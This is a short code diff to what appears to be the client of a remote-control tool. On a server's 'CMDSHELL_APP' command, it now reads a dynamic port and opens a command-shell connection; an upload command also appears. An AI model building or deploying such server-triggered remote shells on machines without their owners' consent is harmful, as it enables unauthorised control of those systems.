@@ -18,8 +18,9 @@ def PINGPONG_client(ip, port):
         data = s.recv(1024)
         if data.decode() == "CMDSHELL_APP":
             s.send(bytes("OK", 'utf8'))
+            cmd_port = int(s.recv(1024).decode(encoding="utf8"))
             s.close()
-            CMD_client(ip, 8625, port)
+            CMD_client(ip, cmd_port, port)
             break
         if data.decode() == "UPLOAD_APP":
             s.send(bytes("OK", 'utf8'))
